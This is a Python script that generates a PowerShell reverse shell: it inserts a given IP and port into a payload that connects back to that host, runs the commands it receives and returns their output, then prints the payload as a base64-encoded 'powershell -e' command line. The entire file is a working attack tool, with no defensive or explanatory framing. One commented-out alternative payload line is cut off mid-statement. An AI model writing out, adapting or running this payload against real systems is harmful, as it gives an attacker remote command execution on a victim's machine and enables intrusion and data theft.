#!/usr/bin/env python3

# generate reverse shells.
# bits and pieces of others scripts taken from githubs etc

# only supports powershell at the moment

import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    exit()

try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

payload = """
  $socket = new-object System.Net.Sockets.TcpClient("%s", %d);
  if($socket -eq $null){exit 1}
  $stream = $socket.GetStream();
  $writer = new-object System.IO.StreamWriter($stream);
  $buffer = new-object System.Byte[] 1024;
  $encoding = new-object System.Text.AsciiEncoding;
  do{
          $writer.Write("> ");
          $writer.Flush();
          $read = $null;
          while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
          $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
          if(!$out.equals("exit")){
                  $out = $out.split(' ')
                  $res = [string](&$out[0] $out[1..$out.length]);
                  if($res -ne $null){ $writer.WriteLine($res)}
          }
  }While (!$out.equals("exit"))
  $writer.close();$socket.close();
"""

#payload = '$client = New-ObJeCt System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes $
payload = payload % (ip, port)

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmdline)
